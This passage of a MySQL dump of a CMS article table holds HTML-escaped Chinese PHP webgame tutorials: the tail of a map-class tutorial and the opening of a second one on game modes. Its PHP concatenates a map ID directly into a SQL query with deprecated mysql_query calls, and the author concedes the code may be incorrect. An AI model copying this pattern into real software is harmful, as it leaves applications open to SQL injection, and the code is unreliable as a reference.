lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;15&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;position:absolute;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;16&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;width:&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[X&lt;/span&gt;&lt;span style=&quot;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;].&quot;px;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;17&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;height:&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[Y&lt;/span&gt;&lt;span style=&quot;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;].&quot;px;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;18&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;z-index:0;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;19&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;left:0px;top:0px;}&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;20&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;21&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;22&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;23&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;function&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;Map_bg(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$Map_ID&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;){&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;24&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;25&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$this&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;-&amp;gt;Map_ID&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$Map_ID&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;26&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;27&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$sql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&quot;select&amp;nbsp;*&amp;nbsp;from&amp;nbsp;map&amp;nbsp;where&amp;nbsp;Map_ID=''&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$this&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;-&amp;gt;Map_ID.&quot;''&quot;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;28&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$result&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;mysql_query&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$sql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;,&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$link&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;29&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;while&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;mysql_fetch_array&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$result&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;))&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;30&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;31&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;&amp;lt;div&amp;nbsp;id=Layer_bg_&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[X&lt;/span&gt;&lt;span style=&quot;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;].&quot;_&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[Y&lt;/span&gt;&lt;span style=&quot;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;].&quot;&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;32&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;&amp;lt;img&amp;nbsp;src=&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[Map_bg].&quot;&amp;nbsp;border=0&amp;nbsp;title=&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;[ID].&quot;&amp;gt;&amp;lt;/div&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;33&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;34&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;35&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;36&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;37&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;}&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;38&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;上面是一个很简单的地图类。代码可能不太正确，意思是正确的。就是根据&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;map&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;表中的坐标，生成了一组&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;层，以及这一组层的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;css&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;你可以改为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;table&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的。你可以也把坐标放到一个字段里，用数组的形式取。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;使用的时候，用&lt;span lang=&quot;EN-US&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:whitesmoke;word-break:break-all;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;mso-font-kerning:0pt;&quot;&gt;new&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;map;&lt;br /&gt;\r\nmap(N);&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;其中&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;N&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;map&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;表里的地图&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-siz', 1, 1, 0, 0, 1302532834, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(49, 1, 'php网页游戏开发入门教程二（游戏模式+系统）', '', '', '&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;一、游戏模式&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;目前&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;游戏模式大体上可以分为以下四类：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、玩家拥有一个城市，不断的升级城市内建筑，建筑可以自动获得物资，可以生产军队，军队之间进行对比数值的战斗。这里我简单的称为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比较优秀的代表：战神世界&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;II&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Travian&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，武林三国，纵横天下，领主&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;online&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，乱舞春秋，热血三国，方便面三国等等。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;这是一个比较成熟的模式，&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;但正因为成熟。因此，玩家接触到这类游戏比较的多，除非你能超过这些优秀的代表，否则就只是简单的重复开发。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; 